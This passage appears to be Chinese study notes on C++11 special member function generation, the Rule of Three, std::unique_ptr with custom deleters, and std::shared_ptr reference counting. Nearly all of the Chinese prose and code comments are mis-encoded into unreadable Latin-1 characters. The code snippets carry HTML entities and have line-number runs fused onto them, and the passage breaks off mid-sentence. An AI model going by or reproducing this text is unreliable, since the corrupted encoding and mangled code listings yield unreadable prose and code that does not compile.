å¦‚æœä¸€ä¸ªç±»æ˜¾å¼å£°æ˜äº†æ‹·è´æ“ä½œï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šç”Ÿæˆç§»åŠ¨æ“ä½œã€‚è¿™ç§é™åˆ¶çš„è§£é‡Šæ˜¯å¦‚æœå£°æ˜æ‹·è´æ“ä½œï¼ˆæ„é€ æˆ–è€…èµ‹å€¼ï¼‰å°±æš—ç¤ºç€å¹³å¸¸æ‹·è´å¯¹è±¡çš„æ–¹æ³•ï¼ˆé€æˆå‘˜æ‹·è´ï¼‰ä¸é€‚ç”¨äºè¯¥ç±»ï¼Œç¼–è¯‘å™¨ä¼šæ˜ç™½å¦‚æœé€æˆå‘˜æ‹·è´å¯¹æ‹·è´æ“ä½œæ¥è¯´ä¸åˆé€‚ï¼Œé€æˆå‘˜ç§»åŠ¨ä¹Ÿå¯èƒ½å¯¹ç§»åŠ¨æ“ä½œæ¥è¯´ä¸åˆé€‚ã€‚ Rule of Three å¦‚æœä½ å£°æ˜äº†æ‹·è´æ„é€ å‡½æ•°ï¼Œæ‹·è´èµ‹å€¼è¿ç®—ç¬¦ï¼Œæˆ–è€…ææ„å‡½æ•°ä¸‰è€…ä¹‹ä¸€ï¼Œä½ åº”è¯¥ä¹Ÿå£°æ˜å…¶ä½™ä¸¤ä¸ªã€‚ å¦‚æœä¸€ä¸ªç±»æ˜¾å¼å£°æ˜äº†æ‹·è´æ“ä½œï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šç”Ÿæˆç§»åŠ¨æ“ä½œã€‚æ‰€ä»¥ï¼ŒC++11ä¸ä¼šä¸ºé‚£äº›æœ‰ç”¨æˆ·å®šä¹‰çš„ææ„å‡½æ•°çš„ç±»ç”Ÿæˆç§»åŠ¨æ“ä½œã€‚ ä»…å½“ä¸‹é¢æ¡ä»¶æˆç«‹æ—¶æ‰ä¼šç”Ÿæˆç§»åŠ¨æ“ä½œï¼ˆå½“éœ€è¦æ—¶ï¼‰ï¼š ç±»ä¸­æ²¡æœ‰æ‹·è´æ“ä½œ ç±»ä¸­æ²¡æœ‰ç§»åŠ¨æ“ä½œ ç±»ä¸­æ²¡æœ‰ç”¨æˆ·å®šä¹‰çš„ææ„ å‡è®¾ç¼–è¯‘å™¨ç”Ÿæˆçš„å‡½æ•°è¡Œä¸ºæ˜¯æ­£ç¡®çš„ï¼ˆå³é€æˆå‘˜æ‹·è´ç±»non-staticæ•°æ®æ˜¯ä½ æœŸæœ›çš„è¡Œä¸ºï¼‰ï¼Œä½ çš„å·¥ä½œå¾ˆç®€å•ï¼ŒC++11çš„= defaultå°±å¯ä»¥è¡¨è¾¾ä½ æƒ³åšçš„ï¼š 1234567891011class Widget &#123; public: â€¦ ~Widget(); //ç”¨æˆ·å£°æ˜çš„ææ„å‡½æ•° â€¦ //é»˜è®¤æ‹·è´æ„é€ å‡½æ•° Widget(const Widget&amp;) = default; //çš„è¡Œä¸ºè¿˜å¯ä»¥ Widget&amp; //é»˜è®¤æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ operator=(const Widget&amp;) = default; //çš„è¡Œä¸ºè¿˜å¯ä»¥ â€¦ &#125;; å°±ç®—ç¼–è¯‘å™¨ä¹äºä¸ºä½ çš„ç±»ç”Ÿæˆæ‹·è´å’Œç§»åŠ¨æ“ä½œï¼Œç”Ÿæˆçš„å‡½æ•°ä¹Ÿå¦‚ä½ æ‰€æ„¿ï¼Œä½ ä¹Ÿåº”è¯¥æ‰‹åŠ¨å£°æ˜å®ƒä»¬ç„¶ååŠ ä¸Š= defaultã€‚è¿™çœ‹èµ·æ¥æ¯”è¾ƒå¤šä½™ï¼Œä½†æ˜¯å®ƒè®©ä½ çš„æ„å›¾æ›´æ˜ç¡®ï¼Œä¹Ÿèƒ½å¸®åŠ©ä½ é¿å…ä¸€äº›å¾®å¦™çš„bugã€‚ å£°æ˜ææ„æœ‰æ½œåœ¨çš„å‰¯ä½œç”¨ï¼šå®ƒé˜»æ­¢äº†ç§»åŠ¨æ“ä½œçš„ç”Ÿæˆã€‚ç„¶è€Œï¼Œæ‹·è´æ“ä½œçš„ç”Ÿæˆæ˜¯ä¸å—å½±å“çš„ã€‚æ‰€ä»¥æ‰‹åŠ¨å£°æ˜ä¸º =default æ˜¯æœ‰æ„ä¹‰çš„ã€‚ C++11 å¤„ç†è§„åˆ™ é»˜è®¤æ„é€ å‡½æ•°ï¼šå’ŒC++98è§„åˆ™ç›¸åŒã€‚ä»…å½“ç±»ä¸å­˜åœ¨ç”¨æˆ·å£°æ˜çš„æ„é€ å‡½æ•°æ—¶æ‰è‡ªåŠ¨ç”Ÿæˆã€‚ ææ„å‡½æ•°ï¼šåŸºæœ¬ä¸Šå’ŒC++98ç›¸åŒï¼›ç¨å¾®ä¸åŒçš„æ˜¯ç°åœ¨ææ„é»˜è®¤noexceptï¼ˆå‚è§Item14ï¼‰ã€‚å’ŒC++98ä¸€æ ·ï¼Œä»…å½“åŸºç±»ææ„ä¸ºè™šå‡½æ•°æ—¶è¯¥ç±»ææ„æ‰ä¸ºè™šå‡½æ•°ã€‚ æ‹·è´æ„é€ å‡½æ•°ï¼šå’ŒC++98è¿è¡Œæ—¶è¡Œä¸ºä¸€æ ·ï¼šé€æˆå‘˜æ‹·è´non-staticæ•°æ®ã€‚ä»…å½“ç±»æ²¡æœ‰ç”¨æˆ·å®šä¹‰çš„æ‹·è´æ„é€ æ—¶æ‰ç”Ÿæˆã€‚å¦‚æœç±»å£°æ˜äº†ç§»åŠ¨æ“ä½œå®ƒå°±æ˜¯deleteçš„ã€‚ä½†æ˜¯ï¼Œå½“ç”¨æˆ·å£°æ˜äº†æ‹·è´èµ‹å€¼æˆ–è€…ææ„ï¼Œè¯¥å‡½æ•°è‡ªåŠ¨ç”Ÿæˆå·²è¢«åºŸå¼ƒã€‚ æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ï¼šå’ŒC++98è¿è¡Œæ—¶è¡Œä¸ºä¸€æ ·ï¼šé€æˆå‘˜æ‹·è´èµ‹å€¼non-staticæ•°æ®ã€‚ä»…å½“ç±»æ²¡æœ‰ç”¨æˆ·å®šä¹‰çš„æ‹·è´èµ‹å€¼æ—¶æ‰ç”Ÿæˆã€‚å¦‚æœç±»å£°æ˜äº†ç§»åŠ¨æ“ä½œå®ƒå°±æ˜¯deleteçš„ã€‚ä½†æ˜¯ï¼Œå½“ç”¨æˆ·å£°æ˜äº†æ‹·è´æ„é€ æˆ–è€…ææ„ï¼Œè¯¥å‡½æ•°è‡ªåŠ¨ç”Ÿæˆå·²è¢«åºŸå¼ƒã€‚ ç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ï¼šéƒ½å¯¹éstaticæ•°æ®æ‰§è¡Œé€æˆå‘˜ç§»åŠ¨ã€‚ä»…å½“ç±»æ²¡æœ‰ç”¨æˆ·å®šä¹‰çš„æ‹·è´æ“ä½œï¼Œç§»åŠ¨æ“ä½œæˆ–ææ„æ—¶æ‰è‡ªåŠ¨ç”Ÿæˆã€‚ ç»“è®º ç‰¹æ®Šæˆå‘˜å‡½æ•°æ˜¯ç¼–è¯‘å™¨å¯èƒ½è‡ªåŠ¨ç”Ÿæˆçš„å‡½æ•°ï¼šé»˜è®¤æ„é€ å‡½æ•°ï¼Œææ„å‡½æ•°ï¼Œæ‹·è´æ“ä½œï¼Œç§»åŠ¨æ“ä½œã€‚ ç§»åŠ¨æ“ä½œä»…å½“ç±»æ²¡æœ‰æ˜¾å¼å£°æ˜ç§»åŠ¨æ“ä½œï¼Œæ‹·è´æ“ä½œï¼Œææ„å‡½æ•°æ—¶æ‰è‡ªåŠ¨ç”Ÿæˆã€‚ æ‹·è´æ„é€ å‡½æ•°ä»…å½“ç±»æ²¡æœ‰æ˜¾å¼å£°æ˜æ‹·è´æ„é€ å‡½æ•°æ—¶æ‰è‡ªåŠ¨ç”Ÿæˆï¼Œå¹¶ä¸”å¦‚æœç”¨æˆ·å£°æ˜äº†ç§»åŠ¨æ“ä½œï¼Œæ‹·è´æ„é€ å°±æ˜¯deleteã€‚ æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ä»…å½“ç±»æ²¡æœ‰æ˜¾å¼å£°æ˜æ‹·è´èµ‹å€¼è¿ç®—ç¬¦æ—¶æ‰è‡ªåŠ¨ç”Ÿæˆï¼Œå¹¶ä¸”å¦‚æœç”¨æˆ·å£°æ˜äº†ç§»åŠ¨æ“ä½œï¼Œæ‹·è´èµ‹å€¼è¿ç®—ç¬¦å°±æ˜¯deleteã€‚å½“ç”¨æˆ·å£°æ˜äº†ææ„å‡½æ•°ï¼Œæ‹·è´æ“ä½œçš„è‡ªåŠ¨ç”Ÿæˆå·²è¢«åºŸå¼ƒã€‚ æˆå‘˜å‡½æ•°æ¨¡æ¿ä¸æŠ‘åˆ¶ç‰¹æ®Šæˆå‘˜å‡½æ•°çš„ç”Ÿæˆã€‚ 18 å¯¹ç‹¬å èµ„æºä½¿ç”¨ std::unique_ptr é»˜è®¤æƒ…å†µä¸‹ï¼Œstd::unique_ptrå¤§å°ç­‰åŒäºåŸå§‹æŒ‡é’ˆï¼Œè€Œä¸”å¯¹äºå¤§å¤šæ•°æ“ä½œï¼ˆåŒ…æ‹¬å–æ¶ˆå¼•ç”¨ï¼‰ï¼Œä»–ä»¬æ‰§è¡Œçš„æŒ‡ä»¤å®Œå…¨ç›¸åŒã€‚è¿™æ„å‘³ç€ä½ ç”šè‡³å¯ä»¥åœ¨å†…å­˜å’Œæ—¶é—´éƒ½æ¯”è¾ƒç´§å¼ çš„æƒ…å†µä¸‹ä½¿ç”¨å®ƒã€‚å¦‚æœåŸå§‹æŒ‡é’ˆå¤Ÿå°å¤Ÿå¿«ï¼Œé‚£ä¹ˆstd::unique_pträ¸€æ ·å¯ä»¥ã€‚ std::unique_pträ½“ç°äº†ä¸“æœ‰æ‰€æœ‰æƒï¼ˆexclusive ownershipï¼‰è¯­ä¹‰ã€‚ ä¸€ä¸ªnon-null std::unique_ptrå§‹ç»ˆæ‹¥æœ‰å…¶æŒ‡å‘çš„å†…å®¹ã€‚ç§»åŠ¨ä¸€ä¸ªstd::unique_ptrå°†æ‰€æœ‰æƒä»æºæŒ‡é’ˆè½¬ç§»åˆ°ç›®çš„æŒ‡é’ˆã€‚ï¼ˆæºæŒ‡é’ˆè¢«è®¾ä¸ºnullï¼‰ æ‹·è´ä¸€ä¸ªstd::unique_ptræ˜¯ä¸å…è®¸çš„ï¼Œå› ä¸ºå¦‚æœä½ èƒ½æ‹·è´ä¸€ä¸ªstd::unique_ptrï¼Œä½ ä¼šå¾—åˆ°æŒ‡å‘ç›¸åŒå†…å®¹çš„ä¸¤ä¸ªstd::unique_ptrï¼Œæ¯ä¸ªéƒ½è®¤ä¸ºè‡ªå·±æ‹¥æœ‰ï¼ˆå¹¶ä¸”åº”å½“æœ€åé”€æ¯ï¼‰èµ„æºï¼Œé”€æ¯æ—¶å°±ä¼šå‡ºç°é‡å¤é”€æ¯ã€‚ å› æ­¤ï¼Œstd::unique_ptræ˜¯ä¸€ç§åªå¯ç§»åŠ¨ç±»å‹ï¼ˆmove-only typeï¼‰ã€‚å½“ææ„æ—¶ï¼Œä¸€ä¸ªnon-null std::unique_ptré”€æ¯å®ƒæŒ‡å‘çš„èµ„æºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œèµ„æºææ„é€šè¿‡å¯¹std::unique_ptré‡ŒåŸå§‹æŒ‡é’ˆè°ƒç”¨deleteæ¥å®ç°ã€‚ Investmentç»§æ‰¿å…³ç³»çš„å·¥å‚å‡½æ•°å¯ä»¥è¿™æ ·å£°æ˜ï¼š 123template&lt;typename... Ts&gt; //è¿”å›æŒ‡å‘å¯¹è±¡çš„std::unique_ptrï¼Œstd::unique_ptr&lt;Investment&gt; //å¯¹è±¡ä½¿ç”¨ç»™å®šå®å‚åˆ›å»ºmakeInvestment(Ts&amp;&amp;... params); è°ƒç”¨è€…åº”è¯¥åœ¨å•ç‹¬çš„ä½œç”¨åŸŸä¸­ä½¿ç”¨è¿”å›çš„std::unique_ptræ™ºèƒ½æŒ‡é’ˆï¼š 123456&#123; â€¦ auto pInvestment = //pInvestmentæ˜¯ makeInvestment( arguments ); //std::unique_ptr&lt;Investment&gt;ç±»å‹ â€¦&#125; //é”€æ¯ *pInvestment std::unique_ptrå°†ä¿è¯æŒ‡å‘å†…å®¹çš„ææ„å‡½æ•°è¢«è°ƒç”¨ï¼Œé”€æ¯å¯¹åº”èµ„æºã€‚ è¿™ä¸ªè§„åˆ™ä¹Ÿæœ‰äº›ä¾‹å¤–ã€‚å¤§å¤šæ•°æƒ…å†µå‘ç”Ÿäºä¸æ­£å¸¸çš„ç¨‹åºç»ˆæ­¢ã€‚ å¦‚æœä¸€ä¸ªå¼‚å¸¸ä¼ æ’­åˆ°çº¿ç¨‹çš„åŸºæœ¬å‡½æ•°ï¼Œæ¯”å¦‚ç¨‹åºåˆå§‹çº¿ç¨‹çš„mainå‡½æ•°å¤–ï¼Œæˆ–è€…è¿ånoexceptè¯´æ˜ï¼Œå±€éƒ¨å˜é‡å¯èƒ½ä¸ä¼šè¢«é”€æ¯ï¼›å¦‚æœstd::abortæˆ–è€…é€€å‡ºå‡½æ•°ï¼ˆå¦‚std::_Exitï¼Œstd::exitï¼Œæˆ–std::quick_exitï¼‰è¢«è°ƒç”¨ï¼Œå±€éƒ¨å˜é‡ä¸€å®šæ²¡è¢«é”€æ¯ã€‚ è‡ªå®šä¹‰åˆ é™¤å™¨ 1234567891011121314151617181920212223242526auto delInvmt = [](Investment* pInvestment) //è‡ªå®šä¹‰åˆ é™¤å™¨ &#123; //ï¼ˆlambdaè¡¨è¾¾å¼ï¼‰ makeLogEntry(pInvestment); delete pInvestment; &#125;;template&lt;typename... Ts&gt;std::unique_ptr&lt;Investment, decltype(delInvmt)&gt; //æ›´æ”¹åçš„è¿”å›ç±»å‹makeInvestment(Ts&amp;&amp;... params)&#123; std::unique_ptr&lt;Investment, decltype(delInvmt)&gt; //åº”è¿”å›çš„æŒ‡é’ˆ pInv(nullptr, delInvmt); if (/*ä¸€ä¸ªStockå¯¹è±¡åº”è¢«åˆ›å»º*/) &#123; pInv.reset(new Stock(std::forward&lt;Ts&gt;(params)...)); &#125; else if ( /*ä¸€ä¸ªBondå¯¹è±¡åº”è¢«åˆ›å»º*/ ) &#123; pInv.reset(new Bond(std::forward&lt;Ts&gt;(params)...)); &#125; else if ( /*ä¸€ä¸ªRealEstateå¯¹è±¡åº”è¢«åˆ›å»º*/ ) &#123; pInv.reset(new RealEstate(std::forward&lt;Ts&gt;(params)...)); &#125; return pInv;&#125; ä¸Šè¿°ä»£ç ä¸­ï¼š delInvmtæ˜¯ä»makeInvestmentè¿”å›çš„å¯¹è±¡çš„è‡ªå®šä¹‰çš„åˆ é™¤å™¨ã€‚ åˆ é™¤å™¨ç±»å‹å¿…é¡»ä½œä¸ºç¬¬äºŒä¸ªç±»å‹å®å‚ä¼ ç»™std::unique_ptrã€‚ å°è¯•å°†åŸå§‹æŒ‡é’ˆï¼ˆæ¯”å¦‚newåˆ›å»ºï¼‰èµ‹å€¼ç»™std::unique_ptré€šä¸è¿‡ç¼–è¯‘ï¼Œå› ä¸ºæ˜¯ä¸€ç§ä»åŸå§‹æŒ‡é’ˆåˆ°æ™ºèƒ½æŒ‡é’ˆçš„éšå¼è½¬æ¢ã€‚è¿™ç§éšå¼è½¬æ¢ä¼šå‡ºé—®é¢˜ï¼Œæ‰€ä»¥C++11çš„æ™ºèƒ½æŒ‡é’ˆç¦æ­¢è¿™ä¸ªè¡Œä¸ºã€‚è¿™å°±æ˜¯é€šè¿‡resetæ¥è®©pInvæ¥ç®¡é€šè¿‡newåˆ›å»ºçš„å¯¹è±¡çš„æ‰€æœ‰æƒçš„åŸå› ã€‚ ä½¿ç”¨newæ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨std::forwardæŠŠä¼ ç»™makeInvestmentçš„å®å‚å®Œç¾è½¬å‘å‡ºå»ã€‚ è‡ªå®šä¹‰åˆ é™¤å™¨çš„ä¸€ä¸ªå½¢å‚ï¼Œç±»å‹æ˜¯Investment*ï¼Œä¸ç®¡åœ¨makeInvestmentå†…éƒ¨åˆ›å»ºçš„å¯¹è±¡çš„çœŸå®ç±»å‹ï¼ˆå¦‚Stockï¼ŒBondï¼Œæˆ–RealEstateï¼‰æ˜¯ä»€ä¹ˆï¼Œå®ƒæœ€ç»ˆåœ¨lambdaè¡¨è¾¾å¼ä¸­ï¼Œä½œä¸ºInvestment*å¯¹è±¡è¢«åˆ é™¤ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬é€šè¿‡åŸºç±»æŒ‡é’ˆåˆ é™¤æ´¾ç”Ÿç±»å®ä¾‹ï¼Œä¸ºæ­¤ï¼ŒåŸºç±»Investmentå¿…é¡»æœ‰è™šææ„å‡½æ•°ã€‚ C++14ä¸­ï¼Œå­˜åœ¨è¿”å›ç±»å‹æ¨å¯¼ï¼Œå†™æ³•æ›´ä¸ºç®€å•ï¼š 12345678910111213141516171819202122232425template&lt;typename... Ts&gt;auto makeInvestment(Ts&amp;&amp;... params) //C++14&#123; auto delInvmt = [](Investment* pInvestment) //ç°åœ¨åœ¨ &#123; //makeInvestmenté‡Œ makeLogEntry(pInvestment); delete pInvestment; &#125;; std::unique_ptr&lt;Investment, decltype(delInvmt)&gt; //åŒä¹‹å‰ä¸€æ · pInv(nullptr, delInvmt); if ( â€¦ ) //åŒä¹‹å‰ä¸€æ · &#123; pInv.reset(new Stock(std::forward&lt;Ts&gt;(params)...)); &#125; else if ( â€¦ ) //åŒä¹‹å‰ä¸€æ · &#123; pInv.reset(new Bond(std::forward&lt;Ts&gt;(params)...)); &#125; else if ( â€¦ ) //åŒä¹‹å‰ä¸€æ · &#123; pInv.reset(new RealEstate(std::forward&lt;Ts&gt;(params)...)); &#125; return pInv; //åŒä¹‹å‰ä¸€æ ·&#125; å½“ä½¿ç”¨é»˜è®¤åˆ é™¤å™¨æ—¶ï¼ˆå¦‚deleteï¼‰ï¼Œä½ å¯ä»¥åˆç†å‡è®¾std::unique_ptrå¯¹è±¡å’ŒåŸå§‹æŒ‡é’ˆå¤§å°ç›¸åŒã€‚ ä½†æ˜¯å½“è‡ªå®šä¹‰åˆ é™¤å™¨æ—¶ï¼Œæƒ…å†µå¯èƒ½ä¸å†å¦‚æ­¤ã€‚å‡½æ•°æŒ‡é’ˆå½¢å¼çš„åˆ é™¤å™¨ï¼Œé€šå¸¸ä¼šä½¿std::unique_ptrçš„ä»ä¸€ä¸ªå­—ï¼ˆwordï¼‰å¤§å°å¢åŠ åˆ°ä¸¤ä¸ªã€‚è¿™å¯èƒ½å¯¼è‡´ std::unique_ptrå¯¹è±¡å˜å¾—è¿‡å¤§ã€‚ 123456789void delInvmt2(Investment* pInvestment) //å‡½æ•°å½¢å¼çš„&#123; //è‡ªå®šä¹‰åˆ é™¤å™¨ makeLogEntry(pInvestment); delete pInvestment;&#125;template&lt;typename... Ts&gt; //è¿”å›ç±»å‹å¤§å°æ˜¯std::unique_ptr&lt;Investment, void (*)(Investment*)&gt; //Investment*çš„æŒ‡é’ˆmakeInvestment(Ts&amp;&amp;... params); //åŠ è‡³å°‘ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆçš„å¤§å° å¯¹äºå‡½æ•°å¯¹è±¡å½¢å¼çš„åˆ é™¤å™¨æ¥è¯´ï¼Œå˜åŒ–çš„å¤§å°å–å†³äºå‡½æ•°å¯¹è±¡ä¸­å­˜å‚¨çš„çŠ¶æ€å¤šå°‘ï¼Œæ— çŠ¶æ€å‡½æ•°ï¼ˆstateless functionï¼‰å¯¹è±¡ï¼ˆæ¯”å¦‚ä¸æ•è·å˜é‡çš„lambdaè¡¨è¾¾å¼ï¼‰å¯¹å¤§å°æ²¡æœ‰å½±å“ï¼Œè¿™æ„å‘³å½“è‡ªå®šä¹‰åˆ é™¤å™¨å¯ä»¥å®ç°ä¸ºå‡½æ•°æˆ–è€…lambdaæ—¶ï¼Œå°½é‡ä½¿ç”¨lambdaã€‚ 123456789auto delInvmt1 = [](Investment* pInvestment) //æ— çŠ¶æ€lambdaçš„ &#123; //è‡ªå®šä¹‰åˆ é™¤å™¨ makeLogEntry(pInvestment); delete pInvestment; &#125;;template&lt;typename... Ts&gt; //è¿”å›ç±»å‹å¤§å°æ˜¯std::unique_ptr&lt;Investment, decltype(delInvmt1)&gt; //Investment*çš„å¤§å°makeInvestment(Ts&amp;&amp;... args); å‘ std::shared_ptr çš„è‡ªåŠ¨è½¬åŒ– std::unique_ptræ˜¯C++11ä¸­è¡¨ç¤ºä¸“æœ‰æ‰€æœ‰æƒçš„æ–¹æ³•ï¼Œä½†æ˜¯å…¶æœ€å¸å¼•äººçš„åŠŸèƒ½ä¹‹ä¸€æ˜¯å®ƒå¯ä»¥è½»æ¾é«˜æ•ˆçš„è½¬æ¢ä¸ºstd::shared_ptrï¼š 12std::shared_ptr&lt;Investment&gt; sp = //å°†std::unique_ptr makeInvestment(arguments); //è½¬ä¸ºstd::shared_ptr è¿™å°±æ˜¯std::unique_ptréå¸¸é€‚åˆç”¨ä½œå·¥å‚å‡½æ•°è¿”å›ç±»å‹çš„åŸå› çš„å…³é”®éƒ¨åˆ†ã€‚ å·¥å‚å‡½æ•°æ— æ³•çŸ¥é“è°ƒç”¨è€…æ˜¯å¦è¦å¯¹å®ƒä»¬è¿”å›çš„å¯¹è±¡ä½¿ç”¨ä¸“æœ‰æ‰€æœ‰æƒè¯­ä¹‰ï¼Œæˆ–è€…å…±äº«æ‰€æœ‰æƒï¼ˆå³std::shared_ptrï¼‰æ˜¯å¦æ›´åˆé€‚ã€‚ ç»“è®º std::unique_ptræ˜¯è½»é‡çº§ã€å¿«é€Ÿçš„ã€åªå¯ç§»åŠ¨ï¼ˆmove-onlyï¼‰çš„ç®¡ç†ä¸“æœ‰æ‰€æœ‰æƒè¯­ä¹‰èµ„æºçš„æ™ºèƒ½æŒ‡é’ˆ é»˜è®¤æƒ…å†µï¼Œèµ„æºé”€æ¯é€šè¿‡deleteå®ç°ï¼Œä½†æ˜¯æ”¯æŒè‡ªå®šä¹‰åˆ é™¤å™¨ã€‚æœ‰çŠ¶æ€çš„åˆ é™¤å™¨ï¼ˆæ•è·å˜é‡çš„lambdaè¡¨è¾¾å¼ï¼‰å’Œå‡½æ•°æŒ‡é’ˆï¼ˆå¸¦å‚æ•°ï¼‰ä¼šå¢åŠ std::unique_ptrå¯¹è±¡çš„å¤§å°ã€‚æ‰€ä»¥æ˜¯ä¸€èˆ¬ä½¿ç”¨æ— çŠ¶æ€çš„ lambda è¡¨è¾¾å¼ å°†std::unique_ptrè½¬åŒ–ä¸ºstd::shared_ptréå¸¸ç®€å• 19 å¯¹äºå…±äº«èµ„æºä½¿ç”¨std::shared_ptr std::shared_ptré€šè¿‡å¼•ç”¨è®¡æ•°ï¼ˆreference countï¼‰æ¥ç¡®ä¿å®ƒæ˜¯å¦æ˜¯æœ€åä¸€ä¸ªæŒ‡å‘æŸç§èµ„æºçš„æŒ‡é’ˆï¼Œå¼•ç”¨è®¡æ•°å…³è”èµ„æºå¹¶è·Ÿè¸ªæœ‰å¤šå°‘std::shared_ptræŒ‡å‘è¯¥èµ„æºã€‚å¦‚æœstd::shared_ptråœ¨è®¡æ•°å€¼é€’å‡åå‘ç°å¼•ç”¨è®¡æ•°å€¼ä¸ºé›¶ï¼Œæ²¡æœ‰å…¶ä»–std::shared_ptræŒ‡å‘è¯¥èµ„æºï¼Œå®ƒå°±ä¼šé”€æ¯èµ„æºã€‚ å¼•ç”¨è®¡æ•°æš—ç¤ºç€æ€§èƒ½é—®é¢˜ï¼š std::shared_ptrå¤§å°æ˜¯åŸå§‹æŒ‡é’ˆçš„ä¸¤å€ï¼Œå› ä¸ºå®ƒå†…éƒ¨åŒ…å«ä¸€ä¸ªæŒ‡å‘èµ„æºçš„åŸå§‹æŒ‡é’ˆï¼Œè¿˜åŒ…å«ä¸€ä¸ªæŒ‡å‘èµ„æºçš„å¼•ç”¨è®¡æ•°å€¼çš„åŸå§‹æŒ‡é’ˆã€‚ å¼•ç”¨è®¡æ•°çš„å†…å­˜å‡ ä¹ä½¿ç”¨åŠ¨æ€åˆ†é…ã€‚ std::make_sharedåˆ›å»ºstd::shared_ptrå¯ä»¥é¿å…å¼•ç”¨è®¡æ•°çš„åŠ¨æ€åˆ†é…ï¼Œä½†æ˜¯è¿˜å­˜åœ¨ä¸€äº›std::make_sharedä¸èƒ½ä½¿ç”¨çš„åœºæ™¯ï¼Œè¿™æ—¶å€™å¼•ç”¨è®¡æ•°å°±ä¼šåŠ¨æ€åˆ†é…ã€‚ é€’å¢é€’å‡å¼•ç”¨è®¡æ•°å¿…é¡»æ˜¯åŸå­æ€§çš„ï¼Œå› ä¸ºå¤šä¸ªreaderã€writerå¯èƒ½åœ¨ä¸åŒçš„çº¿ç¨‹ã€‚æ¯”å¦‚ï¼ŒæŒ‡å‘æŸç§èµ„æºçš„std::shared_ptrå¯èƒ½åœ¨ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œææ„ï¼ˆäºæ˜¯é€’å‡æŒ‡å‘çš„å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼‰ï¼Œåœ¨å¦ä¸€ä¸ªä¸åŒçš„çº¿ç¨‹ï¼Œstd::shared_ptræŒ‡å‘ç›¸åŒçš„å¯¹è±¡ï¼Œä½†æ˜¯æ‰§è¡Œçš„å´æ˜¯æ‹·è´æ“ä½œï¼ˆå› æ­¤é€’å¢äº†åŒä¸€ä¸ªå¼•ç”¨è®¡æ•°ï¼‰ã€‚åŸå­æ“ä½œé€šå¸¸æ¯”éåŸå­æ“ä½œè¦æ…¢ï¼Œæ‰€ä»¥å³ä½¿å¼•ç”¨è®¡æ•°é€šå¸¸åªæœ‰ä¸€ä¸ªwordå¤§å°ï¼Œä½ ä¹Ÿåº”è¯¥å‡å®šè¯»å†™å®ƒä»¬æ˜¯å­˜åœ¨å¼€é”€çš„ã€‚ ç§»åŠ¨std::shared_pträ¼šæ¯”æ‹·è´å®ƒè¦å¿«ï¼šæ‹·è´è¦æ±‚é€’å¢å¼•ç”¨è®¡æ•°å€¼ï¼Œç§»åŠ¨ä¸éœ€è¦ã€‚ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦åŒç†ï¼Œæ‰€ä»¥ç§»åŠ¨æ„é€ æ¯”æ‹·è´æ„é€ å¿«ï¼Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ä¹Ÿæ¯”æ‹·è´èµ‹å€¼è¿ç®—ç¬¦å¿«ã€‚ ä¸ std::unique_ptr çš„åŒºåˆ« std::shared_pträ½¿ç”¨deleteä½œä¸ºèµ„æºçš„é»˜è®¤é”€æ¯æœºåˆ¶ï¼Œä½†æ˜¯å®ƒä¹Ÿæ”¯æŒè‡ªå®šä¹‰çš„åˆ é™¤å™¨ã€‚è¿™ç§æ”¯æŒæœ‰åˆ«äºstd::unique_ptrã€‚å¯¹äºstd::unique_ptræ¥è¯´ï¼Œåˆ é™¤å™¨ç±»å‹æ˜¯æ™ºèƒ½æŒ‡é’ˆç±»å‹çš„ä¸€éƒ¨åˆ†ã€‚å¯¹äºstd::shared_ptråˆ™ä¸æ˜¯ï¼š 1234567891011auto loggingDel = [](Widget *pw) //è‡ªå®šä¹‰åˆ é™¤å™¨ &#123; makeLogEntry(pw); delete pw; &#125;;std::unique_ptr&lt; //åˆ é™¤å™¨ç±»å‹æ˜¯ Widget, decltype(loggingDel) //æŒ‡é’ˆç±»å‹çš„ä¸€éƒ¨åˆ† &gt; upw(new Widget, loggingDel);std::shared_ptr&lt;Widget&gt; //åˆ é™¤å™¨ç±»å‹ä¸æ˜¯ spw(new Widget, loggingDel); //æŒ‡é’ˆç±»å‹çš„ä¸€éƒ¨åˆ† std::shared_ptrçš„è®¾è®¡æ›´ä¸ºçµæ´»ã€‚è€ƒè™‘æœ‰ä¸¤ä¸ªstd::shared_ptr&lt;Widget&gt;ï¼Œæ¯ä¸ªè‡ªå¸¦ä¸åŒçš„åˆ é™¤å™¨ï¼ˆæ¯”å¦‚é€šè¿‡lambdaè¡¨è¾¾å¼è‡ªå®šä¹‰åˆ é™¤å™¨ï¼‰ï¼š 1234auto customDeleter1 = [](Widget *pw) &#123; â€¦ &#125;; //è‡ªå®šä¹‰åˆ é™¤å™¨ï¼Œauto customDeleter2 = [](Widget *pw) &#123; â€¦ &#125;; //æ¯ç§ç±»å‹ä¸åŒstd::shared_ptr&lt;Widget&gt; pw1(new Widget, customDeleter1);std::shared_ptr&lt;Widget&gt; pw2(new Widget, customDeleter2); å› ä¸º pw1 å’Œ pw2 æœ‰ç›¸åŒçš„ç±»å‹ï¼Œæ‰€ä»¥å®ƒä»¬éƒ½å¯ä»¥æ”¾åˆ°å­˜æ”¾é‚£ä¸ªç±»å‹çš„å¯¹è±¡çš„å®¹å™¨ä¸­ï¼š 1std::vector&lt;std::shared_ptr&lt;Widget&gt;&gt; vpw&#123; pw1, pw2 &#125;; å®ƒä»¬ä¹Ÿèƒ½ç›¸äº’èµ‹å€¼ï¼Œä¹Ÿå¯ä»¥ä¼ å…¥ä¸€ä¸ªå½¢å‚ä¸ºstd::shared_ptr&lt;Widget&gt;çš„å‡½æ•°ã€‚ä½†æ˜¯è‡ªå®šä¹‰åˆ é™¤å™¨ç±»å‹ä¸åŒçš„std::unique_ptrå°±ä¸è¡Œï¼Œå› ä¸ºstd::unique_ptræŠŠåˆ 